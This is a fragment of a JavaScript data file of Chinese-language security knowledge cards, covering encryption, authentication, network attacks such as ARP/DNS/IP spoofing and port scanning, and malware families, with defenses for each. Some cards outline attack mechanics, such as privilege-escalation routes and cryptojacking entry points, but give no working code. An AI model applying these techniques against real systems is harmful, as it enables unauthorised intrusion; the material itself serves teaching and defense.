      { to: 'net-vpn', desc: '可信 VPN 是公共网络的加密隧道' },
      { to: 'sec-pki-cert', desc: '证书体系回答"对端公钥是否可信"' },
    ],
  },
  {
    id: 'sec-e2e-encryption',
    name: '端到端加密 E2EE',
    en: 'End-to-End Encryption',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', '隐私'],
    summary: '只有通信两端能解密内容，连服务提供商也只能转发密文——隐私保护的最强形态。',
    detail: `**是什么与不是什么**：
- E2EE：密钥只在用户设备上，服务器只见密文（Signal、WhatsApp、iMessage）
- 它**不同于**"传输加密"（TLS 只保护客户端到服务器这一段，服务器上仍是明文）
- 也**不同于**"云盘加密"（服务商持有密钥就能看你文件）

**实现要点**：每个用户持有密钥对，消息用接收方公钥加密；群聊用**发送者密钥 + 对称轮换**（如 Signal 双棘轮协议，提供前向保密与事后入侵恢复）。

**权衡与争议**：
- 服务端无法做内容审核/反垃圾——平台治理与隐私的矛盾
- 密钥丢失 = 数据永久丢失（通常用恢复短语/多设备同步密钥）
- 元数据（谁和谁、何时）仍可能被服务端观测——E2EE 不等于完全匿名`,
    relations: [
      { to: 'sec-symmetric-encryption', desc: '消息本体用对称加密，密钥协商用非对称' },
      { to: 'sec-asymmetric-encryption', desc: '公钥体系是 E2EE 密钥交换的基石' },
      { to: 'sec-cia', desc: 'E2EE 把机密性保护从"对服务器"升级为"对全世界"' },
    ],
  },
  {
    id: 'sec-password-storage',
    name: '密码存储：加盐与慢哈希',
    en: 'Password Storage',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', '加固'],
    summary: '数据库里的密码必须是"慢哈希+随机盐"，绝不能明文或快哈希——泄露事故中这是最后一道墙。',
    detail: `**错误做法逐级拆解**：
1. 明文存储 → 泄露即全灭，且开发者能看到（内部威胁）
2. MD5/SHA-256 直存 → 彩虹表秒破（预先算好的哈希字典）
3. MD5+盐 → 挡住彩虹表，但 GPU 每秒算数十亿次，暴力破解仍然飞快
4. **bcrypt / scrypt / Argon2id** ✅ —— 刻意缓慢（可调成本因子）+ 内存困难（Argon2 抗 GPU/ASIC）+ 自动加盐

**正确姿势**：
\`\`\`js
const hash = await bcrypt.hash(password, 12); // cost=12 约 250ms
const ok = await bcrypt.compare(input, hash);
\`\`\`

**配套措施**：密码策略别强制 90 天轮换（催生弱密码），改查泄露库（HIBP）；传输层 TLS 之外，登录接口加限流防爆破。

**自查**：如果你的系统"忘记密码"能把原密码发给你——立刻整改，那是明文存储的实锤。`,
    relations: [
      { to: 'sec-hash-function', desc: '普通哈希快是特性，存密码时快是致命缺陷' },
      { to: 'sec-mfa', desc: 'MFA 在密码之上再加一层，密码被撞库也不至于沦陷' },
      { to: 'sec-mitm', desc: 'TLS 保证传输途中密码不被窃听' },
    ],
    example: `// Node.js bcrypt 示例
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash(plain, 12);   // 注册时
const ok = await bcrypt.compare(plain, hash); // 登录时`,
    interview: '经典题链：明文→MD5→MD5+盐→bcrypt 的演进逻辑，能画 GPU 破解速度对比即算透彻。',
  },
  {
    id: 'sec-mfa',
    name: '多因素认证 MFA',
    en: 'Multi-Factor Authentication',
    cat: 'security',
    sub: '认证与访问控制',
    tags: ['认证', '加固'],
    summary: '在密码之外叠加第二类验证因素（手机验证码/动态口令/硬件钥匙），密码泄露不再等于账号沦陷。',
    detail: `**三因素分类**（不同类别组合才是"多因素"）：
1. 知识因素：密码、PIN
2. 持有因素：手机 OTP、TOTP 动态口令（Google Authenticator）、U2F 硬件钥匙（YubiKey）
3. 生物因素：指纹、人脸

两个密码 ≠ MFA（同一类别）；密码 + TOTP 才是。

**强度排序**：短信验证码（可被 SIM 卡劫持/无线截获，最弱但仍好于没有）< TOTP（本地生成，不怕转发）< **硬件钥匙 FIDO2/WebAuthn**（绑定域名，钓鱼站拿不到——抗钓鱼的终极方案）。

**实践要点**：
- 管理后台、代码仓库、云控制台强制 MFA
- 提供"恢复码"防设备丢失，但恢复码本身要安全存储
- 大量账号泄露事件（含巨头）都被"未开 MFA 的管理员账号"一句话概括`,
    relations: [
      { to: 'sec-password-storage', desc: 'MFA 与慢哈希共同构成密码体系的双保险' },
      { to: 'sec-phishing', desc: 'FIDO2 硬件钥匙从密码学上免疫钓鱼站' },
      { to: 'sec-iam', desc: 'MFA 是 IAM 体系中的核心认证策略' },
    ],
  },
  {
    id: 'sec-session-security',
    name: '会话安全',
    en: 'Session Security',
    cat: 'security',
    sub: '认证与访问控制',
    tags: ['认证', 'Web安全'],
    summary: '会话凭证的生成、传输、存储与销毁全生命周期管理——会话被偷等于密码被偷。',
    detail: `**全生命周期防护要点**：

1. **生成**：Session ID 用密码学随机数（≥128 位熵）；JWT 用强签名密钥
2. **传输**：仅走 HTTPS（Secure 标记），防 MITM 窃取
3. **存储**：Cookie 加 \`HttpOnly\`（JS 读不到，防 XSS 偷取）+ \`SameSite\`（防 CSRF 携带）
4. **有效期**：空闲超时 + 绝对超时；JWT 用短期 Access Token + Refresh Token 轮换
5. **销毁**：登出必须服务端失效（服务端会话表拉黑 / JWT 黑名单），仅删 Cookie 不够
6. **绑定与轮换**：登录后重置 Session ID（防会话固定攻击）；敏感操作二次认证

**JWT 特有坑**：签发后无法主动作废（除非黑名单）——改密码/封号后旧 Token 仍有效；\`alg: none\` 攻击与弱密钥爆破是常见翻车点。`,
    relations: [
      { to: 'be-cookie-session', desc: 'Cookie 属性是会话安全的第一道配置' },
      { to: 'be-jwt', desc: 'JWT 的无状态特性带来特殊的吊销难题' },
      { to: 'sec-xss', desc: 'HttpOnly 直接针对 XSS 窃取会话' },
      { to: 'sec-csrf', desc: 'SameSite 同时是 CSRF 的核心防御' },
    ],
    interview: '对比"服务端 Session vs JWT"时，吊销能力与扩展性权衡是标准答案框架。',
  },
  {
    id: 'sec-access-control',
    name: '访问控制模型',
    en: 'Access Control Models',
    cat: 'security',
    sub: '认证与访问控制',
    tags: ['权限', '架构'],
    summary: 'DAC 自主授权、MAC 强制分级、RBAC 按角色、ABAC 按属性——四代模型应对不同管控强度。',
    detail: `**四大模型演进**：

1. **DAC 自主访问控制**：资源所有者自行授权（如 Unix 文件 chmod）——灵活但易扩散失控
2. **MAC 强制访问控制**：系统按安全标签强制裁决（军事"绝密/机密"级）——最严格，操作系统 SELinux 采用
3. **RBAC 基于角色**：权限绑定角色，用户挂角色——企业应用主流（admin/editor/viewer）
4. **ABAC 基于属性**：按主体/资源/环境属性动态裁决（"部门=财务 且 工作时间 且 数据等级≤3"）——最灵活，云策略引擎（AWS IAM Condition）方向

**漏洞视角**：最大问题是**失效的访问控制**（OWASP #1）——接口忘记鉴权、水平越权（改 URL 里的 userId 看别人订单）、垂直越权（普通用户调管理员接口）。防御：服务端对**每个请求**做鉴权（不信任前端隐藏按钮），对象级权限检查（这条数据属于他吗）。`,
    relations: [
      { to: 'be-rbac', desc: 'RBAC 是后端权限系统的主流实现' },
      { to: 'sec-least-privilege', desc: '所有模型都在追求最小权限的可运营化' },
      { to: 'sec-iam', desc: '访问控制模型是 IAM 的裁决内核' },
      { to: 'sec-privesc', desc: '越权与提权正是访问控制失效的攻击形态' },
    ],
    interview: '举一个水平越权实例（/orders/123 改成 /orders/124）并讲对象级鉴权，比背模型名词更打动面试官。',
  },
  {
    id: 'sec-privesc',
    name: '权限提升',
    en: 'Privilege Escalation',
    cat: 'security',
    sub: '认证与访问控制',
    tags: ['攻击', '权限'],
    summary: '攻击者从低权限立足点爬向更高权限：垂直提权拿 root/管理员，水平提权冒充同级其他用户。',
    detail: `**两种方向**：

- **垂直提权**：普通用户 → 管理员/root。手段：未修补的内核漏洞（Dirty Cow、Dirty Pipe）、SUID 配置错误、服务以 root 运行可写、sudoers 配置疏漏、容器逃逸
- **水平越权**：用户 A 访问用户 B 的数据。手段：改 URL/请求参数中的对象 ID、伪造 JWT 中的用户标识、调用缺失对象级鉴权的接口

**在攻击链中的位置**：初始立足点（钓鱼附件/注入）→ **本地提权** → 横向移动 → 达成目标。提权是杀伤链的放大器。

**防御**：
- 及时打补丁（内核/服务），关闭多余 SUID
- 服务进程最小权限 + 容器加固（只读文件系统、去 capabilities）
- **服务端对象级鉴权**全覆盖，接口默认拒绝
- sudo 精确到命令白名单，审计日志齐全`,
    relations: [
      { to: 'sec-access-control', desc: '越权是访问控制失效的直接结果' },
      { to: 'sec-least-privilege', desc: '最小权限让提权无梯可爬' },
      { to: 'sec-attack-surface', desc: '提权漏洞属于最隐蔽的内部攻击面' },
    ],
  },
  {
    id: 'sec-iam',
    name: '身份与访问管理 IAM',
    en: 'Identity & Access Management',
    cat: 'security',
    sub: '认证与访问控制',
    tags: ['权限', '架构'],
    summary: '管理"谁能以什么身份访问什么"的全生命周期体系：认证、授权、账号治理与审计的统一框架。',
    detail: `**四大职能**：
1. **认证**：你是谁（密码/MFA/SSO 下的统一身份源 IdP）
2. **授权**：你能干什么（RBAC/ABAC 策略引擎）
3. **账号治理**：入职自动开通、转岗自动调整、离职自动回收（Joiner-Mover-Leaver 流程）——被遗忘的"僵尸账号"是重大隐患
4. **审计**：谁在什么时候干了什么（登录日志、操作日志、异常行为分析）

**工程形态**：企业用 IdP（Keycloak / Okta / 飞书钉钉身份）统一认证，应用接 OIDC/SAML；云上 IAM（AWS IAM 等）用策略 JSON 精细到 API 级别。

**高频事故模式**：长期有效的 Access Key 泄露进 GitHub；被遗忘的运维账号；第三方应用被授予过宽 OAuth scope。

**最佳实践**：短期凭证优先（STS/OIDC 联合）、权限定期复核（Access Review）、特权账号走 PAM 堡垒机并全程录像。`,
    relations: [
      { to: 'be-sso', desc: 'SSO 是 IAM 统一认证的用户侧体现' },
      { to: 'be-oauth2', desc: 'OAuth2/OIDC 是应用接入 IAM 的标准协议' },
      { to: 'sec-mfa', desc: 'MFA 是 IAM 认证强度的核心策略' },
      { to: 'sec-least-privilege', desc: 'IAM 把最小权限从原则变成可运营流程' },
    ],
  },

  /* ---------- 网络攻防 ---------- */
  {
    id: 'sec-port-scan',
    name: '端口扫描',
    en: 'Port Scanning',
    cat: 'security',
    sub: '网络攻防',
    tags: ['攻击', '侦察'],
    summary: '攻击者探测目标主机哪些端口开放、跑什么服务——一切外部攻击前先"敲门踩点"。',
    detail: `**原理**：向目标主机的端口范围发起连接尝试，根据响应判断状态：开放（accept）、关闭（RST）、被过滤（无响应）。工具以 nmap 为代表。

**常见手法**：
- **TCP SYN 扫描**（半开扫描）：发 SYN 收 SYN/ACK 即开放，不发最后 ACK——不留完整连接日志
- **UDP 扫描**：无响应即开放（UDP 不回 RST），慢且噪音大
- **版本探测**：连上后抓 banner（如 "SSH-2.0-OpenSSH_8.9"）定位服务与版本，用于匹配已知漏洞

**攻防视角**：扫描是攻击的**侦察阶段**——攻击者据此收敛攻击面（只打开放且有漏洞的服务）。
**防御**：关闭无用端口（最小攻击面）、防火墙白名单、对扫描行为限速/拉黑（Fail2ban）、内网也分段（防内网侦察）、蜜罐捕获扫描者。`,
    relations: [
      { to: 'sec-attack-surface', desc: '扫描是攻击者从外部测绘你攻击面的手段' },
      { to: 'sec-honeypot', desc: '蜜罐把扫描者引入诱捕环境' },
      { to: 'net-firewall', desc: '防火墙白名单让扫描只看到极少量开放端口' },
    ],
  },
  {
    id: 'sec-arp-spoofing',
    name: 'ARP 欺骗',
    en: 'ARP Spoofing',
    cat: 'security',
    sub: '网络攻防',
    tags: ['攻击', '局域网'],
    summary: '在局域网内伪造 ARP 应答冒充网关，把他人流量引到自己机器过一遍——内网中间人的经典手法。',
    detail: `**原理**：局域网通信靠 ARP 把 IP 解析成 MAC 地址，且 ARP 应答**不经验证**——谁喊"我是网关的 IP，MAC 是 xx"主机就信谁。攻击者持续向受害者发伪造 ARP 应答，声称"网关 IP 对应我的 MAC"，于是受害者的流量先到攻击者，再由攻击者转发给真网关（开启转发保持能上网，避免被发现）。

**危害**：同一局域网内的**流量窃听**（明文密码直出）、会话劫持、HTTPS 剥离、断网攻击（只骗不转发）。

**防御**：
1. 交换机 **Dynamic ARP Inspection**（DAI）+ DHCP Snooping——校验 ARP 应答合法性
2. 静态 ARP 绑定网关（小网络可行）
3. 全程 HTTPS/VPN——即使被劫持也只见密文
4. 公共 WiFi 的根本危险就在于此：你无法确认同网段里没有"假的网关"`,
    relations: [
      { to: 'sec-mitm', desc: 'ARP 欺骗是实现内网 MITM 的前置手段' },
      { to: 'net-https', desc: '端到端加密让被劫持的流量仍不可读' },
      { to: 'net-vpn', desc: 'VPN 隧道在不可信局域网上建立可信通道' },
    ],
  },
  {
    id: 'sec-dns-hijack',
    name: 'DNS 劫持与污染',
    en: 'DNS Hijacking & Poisoning',
    cat: 'security',
    sub: '网络攻防',
    tags: ['攻击', 'DNS'],
    summary: '篡改域名解析结果：把银行域名指到假站、把下载链接指到木马——你敲对的地址，去的却不是对的地方。',
    detail: `**两种形态**：

1. **劫持（Hijack）**：改的是"配置"——路由器 DNS 被改、hosts 文件被写、域名注册商账号被盗改 NS 记录（指向攻击者服务器）
2. **污染/投毒（Poisoning）**：改的是"应答"——在 DNS 查询路径上抢先用伪造应答污染缓存（Kaminsky 攻击利用事务 ID 猜测批量投毒），或运营商在链路上拦截应答插广告

**危害**：钓鱼站接管（假银行站拿明文密码）、软件更新通道投毒（供应链级 RCE）、大面积断网。

**防御**：
1. **DNSSEC**：应答带数字签名，篡改即验签失败（部署率仍不够高）
2. **DoH/DoT**（DNS over HTTPS/TLS）：查询加密，防链路劫持
3. 路由器改可信 DNS + 改默认管理密码；域名开注册商锁与双因素
4. 关键分发渠道配签名校验（配合 sec-supply-chain）`,
    relations: [
      { to: 'net-dns', desc: '理解 DNS 解析链路才能理解哪里能被动手脚' },
      { to: 'sec-mitm', desc: 'DNS 劫持是把用户引到假服务器的手段' },
      { to: 'sec-supply-chain', desc: '更新通道被 DNS 劫持即成供应链攻击' },
    ],
  },
  {
    id: 'sec-ip-spoofing',
    name: 'IP 欺骗',
    en: 'IP Spoofing',
    cat: 'security',
    sub: '网络攻防',
    tags: ['攻击', '网络'],
    summary: '伪造源 IP 地址发包：隐藏真实来源、冒充可信主机、发起反射放大攻击。',
    detail: `**原理**：IP 协议本身不验证源地址真实性——发送方在 IP 头里填什么源 IP，接收方就看到什么。攻击者可宣称自己是任意 IP。

**三种用途**：
1. **隐藏自身**：攻击流量看不出真身（但双向通信需要收到回包，所以完整攻击需配合路由操纵）
2. **反射放大 DDoS**：伪造受害者 IP 向开放 DNS/NTP 服务器发小请求，大响应全部砸向受害者——IP 欺骗是放大型 DDoS 的技术前提
3. **绕过 IP 白名单**：某些"仅允许内网 IP"的接口如果信任源 IP 头，可被伪造绕过（应用层还可伪造 X-Forwarded-For）

**防御**：
- 运营商入口做 **uRPF**（反向路径校验）丢弃源地址不合逻辑的包——互联网级治理
- 应用层：**绝不基于源 IP 做认证**；取真实 IP 时按可信代理链解析 X-Forwarded-For
- 内网交换机端口级 IP-MAC 绑定`,
    relations: [
      { to: 'net-ddos', desc: '反射放大 DDoS 依赖 IP 欺骗' },
      { to: 'sec-arp-spoofing', desc: '同属"网络身份可伪造"家族，一个在链路层一个在网络层' },
      { to: 'be-rate-limit', desc: '限流若按可伪造的 IP 计数，攻击者换个源 IP 即绕过' },
    ],
  },
  {
    id: 'sec-waf',
    name: 'Web 应用防火墙 WAF',
    en: 'Web Application Firewall',
    cat: 'security',
    sub: '网络攻防',
    tags: ['防御', 'Web安全'],
    summary: '拦截在应用前分析 HTTP 流量，按规则库挡 SQL 注入/XSS/扫描器等攻击——Web 服务的"安检门"。',
    detail: `**是什么**：部署在 Web 应用前（云 WAF / Nginx ModSecurity / 云厂商 WAF），对每个请求做深度解析与规则匹配，命中攻击特征就拦截或告警。防的主要是 OWASP 常见款：注入、XSS、路径穿越、扫描器指纹、CC 刷量。

**能力边界（必须清楚）**：
- **基于规则 → 可被绕过**：编码变形（双重 URL 编码）、注释混淆、分块传输、参数污染都可能是绕过手法——WAF 是"减噪层"不是"根治层"
- 看不到加密流量内部（除非做 TLS 卸载）
- 业务逻辑漏洞（越权、支付金额篡改）WAF 完全无感

**正确姿势**：
1. WAF + 安全代码（纵深防御的外层与内层）
2. 开学习模式生成基线，防误杀
3. 拦截日志接入 SIEM 做攻击趋势分析（谁在持续扫你）`,
    relations: [
      { to: 'sec-defense-in-depth', desc: 'WAF 是纵深防御中外围的规则拦截层' },
      { to: 'sec-sql-injection', desc: 'WAF 常能挡住通用注入 payload，但不能替代参数化查询' },
      { to: 'be-rate-limit', desc: 'WAF 的 CC 防护与业务限流配合使用' },
    ],
  },
  {
    id: 'sec-ids-ips',
    name: '入侵检测与防御 IDS/IPS',
    en: 'IDS / IPS',
    cat: 'security',
    sub: '网络攻防',
    tags: ['防御', '监控'],
    summary: 'IDS 像监控摄像头（发现并告警），IPS 像安检门（发现即阻断）——网络与主机异常行为的哨兵。',
    detail: `**两种部署角色**：

- **IDS 入侵检测**：旁路镜像流量，发现恶意行为只告警不拦截（Suricata/Snort 典型）——不影响业务，靠人响应
- **IPS 入侵防御**：串接在流量路径上，可实时丢包、断连、封 IP——能力强但误杀会伤业务

**检测方式**：
1. **特征检测**：匹配已知攻击签名（类似杀软病毒库）——对新攻击盲
2. **异常检测**：建流量/行为基线，偏离即告警（如凌晨三点某主机突然扫描全网段）——能抓未知，误报率高

**主机侧搭档 HIDS**：监控文件完整性（Tripwire/AIDE）、异常进程、提权行为。

**实践**：IDS/IPS 告警接入 SIEM 聚合分析；规则库持续更新；把"发现-响应"流程（配合 sec-incident-response）跑通才有意义——只会响不会动的哨兵没有价值。`,
    relations: [
      { to: 'sec-siem', desc: 'IDS/IPS 的告警是 SIEM 的核心数据源之一' },
      { to: 'sec-honeypot', desc: '蜜罐流量天然高置信，喂给 IDS 训练基线' },
      { to: 'sec-defense-in-depth', desc: 'IDS/IPS 是网络层的检测型防线' },
    ],
  },
  {
    id: 'sec-honeypot',
    name: '蜜罐',
    en: 'Honeypot',
    cat: 'security',
    sub: '网络攻防',
    tags: ['防御', '诱捕'],
    summary: '伪装成真实目标的陷阱系统，没有任何正常用户会访问——进来的一定是攻击者，误报率极低。',
    detail: `**原理**：部署一个"看起来有价值"的假目标（假数据库、假后台、假工控设备），布满埋点记录攻击者的一举一动。因为合法流量永远不会碰它，**任何交互都是高置信度的攻击信号**。

**分类**：
- 低交互：模拟服务 banner 与端口（nmap 扫它像真 MySQL），成本低保真度低
- 高交互：真实操作系统/服务的沙箱化副本，能记录完整攻击手法（提取样本、分析 0day）

**价值**：
1. **早期预警**：攻击者内网侦察时先踩到蜜罐——在碰到真系统前就暴露
2. **情报收集**：学习攻击手法、捕获恶意样本、喂给 IDS/SIEM
3. **消耗攻击者时间**（拖延即防御）

**实践**：生产环境撒几台低交互蜜罐（如 opencanary）性价比极高；注意做好隔离与监控，别让蜜罐本身变成跳板。`,
    relations: [
      { to: 'sec-ids-ips', desc: '蜜罐产出的高置信事件直接驱动 IDS/IPS 告警' },
      { to: 'sec-port-scan', desc: '扫描器最容易先撞上蜜罐' },
      { to: 'sec-zero-trust', desc: '蜜罐是"假设已被攻破"思路下的主动诱捕设施' },
    ],
  },
  {
    id: 'sec-botnet',
    name: '僵尸网络',
    en: 'Botnet',
    cat: 'security',
    sub: '网络攻防',
    tags: ['攻击', '恶意软件'],
    summary: '被植入木马的成千上万台设备受攻击者遥控组成"僵尸大军"，是 DDoS、垃圾邮件、挖矿的火力来源。',
    detail: `**构成**：肉鸡（被控主机：失陷服务器、路由器、摄像头等 IoT）+ C2 控制（命令与控制服务器，或 P2P 去中心化指令通道）。知名家族如 Mirai（用默认密码扫穿海量摄像头，制造过 1Tbps 级 DDoS）。

**攻击者生意模式**：按小时出租 DDoS 火力、群发钓鱼邮件、挖矿、代理出口售卖——僵尸网络是地下产业的"基础设施"。

**生命周期**：入侵植入（弱口令/漏洞/钓鱼）→ 加入 C2 → 等待指令 → 执行任务。

**防御**：
- **对网站**：DDoS 高防 + WAF 挡僵尸流量；识别数据中心 IP 与代理 IP
- **对自己设备**：改默认密码、打补丁、关闭不必要的外网管理口——别让你的设备成为别人军火库的一员
- **治理层**： Sinkhole 吞噬 C2 域名、执法机构协同 takedown`,
    relations: [
      { to: 'net-ddos', desc: '僵尸网络是超大规模 DDoS 的主要火力来源' },
      { to: 'sec-malware', desc: '肉鸡就是被恶意软件控制的宿主' },
      { to: 'sec-cryptojacking', desc: '挖矿是僵尸网络的常见变现手段' },
    ],
  },
  {
    id: 'sec-phishing',
    name: '钓鱼攻击',
    en: 'Phishing',
    cat: 'security',
    sub: '网络攻防',
    tags: ['攻击', '社会工程'],
    summary: '伪装成可信方骗取凭据或诱导执行恶意程序——不需要高超技术，却是现实中成功率最高的攻击。',
    detail: `**形态谱系**：
- **邮件钓鱼**：假冒 IT 部门"密码即将过期"链接到高仿登录页；假冒老板的"紧急转账"（BEC 商业邮件诈骗，年损失数十亿美元）
- **鱼叉式**：针对特定人定制内容（爬你社交动态，提你领导的名字）——精准度极高
- **钓鲸/短信/二维码**：向高管、用短信、藏恶意码于 QR

**为什么有效**：利用的不是系统漏洞而是**人性**——紧迫感（"2 小时内不处理账号冻结"）、权威（CEO 头像）、恐惧与好奇。技术防御再好，一个"在某些人看来有点像"的域名 + 一封好剧本的邮件就可能全线失守。

**防御**：
- 邮件网关 SPF/DKIM/DMARC 三件套校验发件域
- 全员演练（发假钓鱼测点击率）+ 无责上报文化
- **MFA 尤其 FIDO2 硬件钥匙**——凭据被骗走也登不上（网站域名绑定）
- 登录页域名白名单习惯、浏览器密码管理器（自动填充对不上假域名）`,
    relations: [
      { to: 'sec-social-engineering', desc: '钓鱼是社会工程学最规模化的形态' },
      { to: 'sec-mfa', desc: 'FIDO2 MFA 让被钓走的密码失效' },
      { to: 'sec-botnet', desc: '钓鱼附件是植入僵尸木马的主要途径' },
    ],
  },
  {
    id: 'sec-malware',
    name: '恶意软件谱系',
    en: 'Malware Taxonomy',
    cat: 'security',
    sub: '恶意软件',
    tags: ['恶意软件', '概念'],
    summary: '病毒、蠕虫、木马、勒索、间谍、Rootkit——按传播方式与行为给恶意软件分类看危害。',
    detail: `**按传播/驻留方式分**：

- **病毒**：依附宿主文件传播（用户主动运行带毒文件）
- **蠕虫**：自主通过网络漏洞传播，无需人操作（WannaCry 靠 SMB 漏洞横扫全球）
- **木马**：伪装成正常软件骗用户安装，背后开后门（RAT 远控）
- **Rootkit**：潜伏在系统内核层隐藏自身（进程/文件都看不到）

**按行为分**：勒索（加密勒索）、间谍（窃密）、挖矿（偷算力）、后门、下载器（拉取后续载荷）。

**现代威胁链**：钓鱼邮件 → 下载器 → 蠕虫式横向 → 勒索/窃密（多组件协作的"全家桶"）。

**防御纵深**：邮件网关 + EDR 终端检测 + 及时补丁（挡蠕虫）+ 最小权限（限制蔓延）+ 离线备份（勒索兜底）。`,
    relations: [
      { to: 'sec-ransomware', desc: '勒索软件是当前危害最大的恶意软件门类' },
      { to: 'sec-rootkit', desc: 'Rootkit 是最难检测的驻留形态' },
      { to: 'sec-phishing', desc: '钓鱼是恶意软件进入组织的头号入口' },
    ],
  },
  {
    id: 'sec-ransomware',
    name: '勒索软件',
    en: 'Ransomware',
    cat: 'security',
    sub: '恶意软件',
    tags: ['恶意软件', '勒索'],
    summary: '加密你的文件索要赎金，现代变种还窃取数据双重施压——企业安全的头号现实威胁。',
    detail: `**攻击链**：钓鱼附件/暴露的 RDP/漏洞入侵 → 提权 → 关闭杀软 → **内网横向**（偷管理员凭证）→ 找到文件服务器与备份 → **先窃取数据**（双重勒索：不付钱就公开）→ 批量加密 → 弹窗要赎金（通常数万到数百万美元等值加密货币）。

**著名事件**：WannaCry（2017，利用 Windows SMB 漏洞一夜席卷 150 国）、Colonial Pipeline（美国输油管道停摆）。

**为什么企业怕**：备份被一并加密/删除、停产损失远超赎金、数据公开的合规与声誉风险。

**防御（按优先级）**：
1. **离线/不可变备份** + 定期恢复演练（3-2-1 原则）——唯一能让你不看绑匪脸色的底牌
2. 补丁管理与 EDR（挡初始入侵与横向）
3. 网络分段（服务器区与办公区隔离）
4. 最小权限 + MFA（RDP 与 VPN 是重灾区入口）`,
    relations: [
      { to: 'ops-backup-dr', desc: '不可变备份与恢复演练是勒索的终极兜底' },
      { to: 'sec-malware', desc: '勒索软件是恶意软件中危害最大的门类' },
      { to: 'sec-privesc', desc: '横向提权是勒索软件扩大战果的关键步骤' },
      { to: 'sec-cia', desc: '同时打击完整性与可用性的教科书式威胁' },
    ],
  },
  {
    id: 'sec-rootkit',
    name: 'Rootkit',
    en: 'Rootkit',
    cat: 'security',
    sub: '恶意软件',
    tags: ['恶意软件', '隐蔽'],
    summary: '潜伏在操作系统内核层的后门，能向系统本身隐藏自己的进程、文件与网络连接——最难检测的恶意软件。',
    detail: `**原理**："root"+"kit"——获得 root 权限后安装的一套隐藏组件。通过挂钩（hook）系统调用，当你运行 \`ls\` 或任务管理器时，它把自己从结果中过滤掉——**你用来查杀的工具本身就是被污染的信息源**。

**类型**：用户态（替换 ps/ls 等工具）、内核态（加载驱动/内核模块，最强隐蔽）、引导态（感染 MBR/UEFI，重装系统都在）、固件态（藏进硬件固件，近乎不死）。

**典型用途**：长期潜伏驻留（APT 攻击的"钉子"）、隐藏挖矿/僵尸进程、绕过检测。

**防御与检测**：
- 预防为主：内核完整性保护、安全启动（Secure Boot）、最小权限（进不来 root 就装不上）
- 检测要"跳出系统看"：离线扫描、内存取证、基于完整性的对比（从可信介质启动后比对）
- 怀疑中招时的最稳妥做法是重装 + 凭证全换——信任一旦污染很难重建`,
    relations: [
      { to: 'sec-malware', desc: 'Rootkit 是隐蔽性最强的恶意软件驻留形态' },
      { to: 'sec-forensics', desc: '内存取证是对抗 Rootkit 隐藏的关键手段' },
      { to: 'emb-bootloader', desc: '引导态/固件态 Rootkit 与设备启动链安全直接相关' },
    ],
  },
  {
    id: 'sec-cryptojacking',
    name: '挖矿木马',
    en: 'Cryptojacking',
    cat: 'security',
    sub: '恶意软件',
    tags: ['恶意软件', '云安全'],
    summary: '偷偷用你的电脑/服务器/云资源挖加密货币——不偷数据不破坏，但账单和性能都是你的。',
    detail: `**两种形态**：
1. **主机挖矿**：入侵服务器后下载矿机程序（XMRig 挖门罗币最常见），CPU 长期满载
2. **浏览器挖矿**：网页嵌入 JS 挖矿脚本，访客打开页面就替攻击者算哈希（CoinHive 时代曾泛滥，现多转为钓鱼诱导运行"测试脚本"）

**云上重灾区**：暴露的 Docker API（2375 端口）、弱口令 Redis 写 crontab、K8s 未授权 Dashboard——攻击者扫到即部署 DaemonSet 全集群挖矿。特征：云账单 CPU 异常暴涨、进程伪装（kdevtmpfsi 等假名）、crontab 反复复活（守护脚本）。

**防御**：
- 云凭证与容器端口绝不裸奔（2375/6379/8080 加固）
- EDR/主机审计盯"未知高 CPU 进程"与计划任务
- 云账单告警（预算异常是最早的哨兵）
- 出网白名单：矿池域名/IP 直接掐断`,
    relations: [
      { to: 'sec-botnet', desc: '挖矿是僵尸网络最重要的变现方式之一' },
      { to: 'ops-server', desc: '暴露的管理端口与弱口令是挖矿木马的主要入口' },
      { to: 'sec-least-privilege', desc: '最小权限与出网管控可阻断矿机部署与连通' },
    ],
  },
  {
    id: 'sec-social-engineering',
    name: '社会工程学',
    en: 'Social Engineering',
    cat: 'security',
    sub: '社会工程与对抗',
    tags: ['攻击', '人性'],
    summary: '攻击"人"这个最薄弱环节：用心理操纵骗取信任、凭据或权限——最防火墙挡不住的攻击。',
    detail: `**核心心理武器**（Cialdini 影响力六原则的安全化）：
- **权威**："我是 IT 总监，马上帮我重置 VPN 密码"
- **紧迫**："10 分钟内不操作账号将被冻结"
- **社交认同**："全组都升级了，就差你了"
- **互惠**：先送小礼品/帮小忙再提要求

**典型手法**：电话冒充（打给前台骗内网信息）、USB 撒放（停车场丢"工资单U盘"）、物理潜入（穿工牌马甲尾随进机房）、MFA 疲劳轰炸（半夜狂发推送直到手滑点同意）。

**为什么可怕**：防火墙、EDR 对"员工主动把密码打进假网站/把验证码念给骗子"全部失效——重大泄露事件中过半始于社工。

**防御（本质是组织治理）**：
- 流程硬约束：任何人（含"CEO"）的转账/密码重置请求必须走带外渠道复核
- 定期演练 + 无责上报奖励
- 号码/身份验证 SOP；MFA 推送改用数字匹配模式（显示两位数字让用户核对）`,
    relations: [
      { to: 'sec-phishing', desc: '钓鱼是社会工程学最规模化的落地形态' },
      { to: 'sec-mfa', desc: 'MFA 疲劳轰炸说明：防御手段本身也会被社工化' },
      { to: 'sec-cia', desc: '人这一环失守可让机密性防线整体归零' },
    ],
  },
  {
    id: 'sec-red-blue-team',
    name: '红队 / 蓝队 / 紫队',
    en: 'Red / Blue / Purple Team',
    cat: 'security',
    sub: '社会工程与对抗',
    tags: ['对抗', '团队'],
    summary: '红队扮演攻击者检验防御，蓝队负责防守与响应，紫队把双方拉通让每次对抗都变成组织学习。',
    detail: `**角色分工**：

- **红队（Red Team）**：以真实攻击者视角、在授权范围内对目标做全链路模拟入侵（初始访问→横向→拿目标数据），检验"防御体系在真实攻击下是否真的有效"。区别于渗透测试：红队更强调隐蔽、持续与战术对抗，不限于找漏洞清单。
- **蓝队（Blue Team）**：防守方——监控告警、事件响应、加固、取证。日常运营 SIEM/EDR 的就是他们。
- **紫队（Purple Team）**：不是第三个队，而是**协作模式**——红队每次动作同步给蓝队，蓝队实时调整检测规则；把"攻防对抗"变成"持续改进的反馈回路"。

**配套概念**：ATT&CK 框架（把攻击战术技术标准化，红队按 T 编号复现、蓝队按编号补检测覆盖图）、BAS（入侵与攻击模拟，自动化紫队）。

**价值**：安全投入是否有效，只有被真实打一遍才知道——"我们买了很多安全设备"与"我们能发现并响应一次真实入侵"是两回事。`,
    relations: [
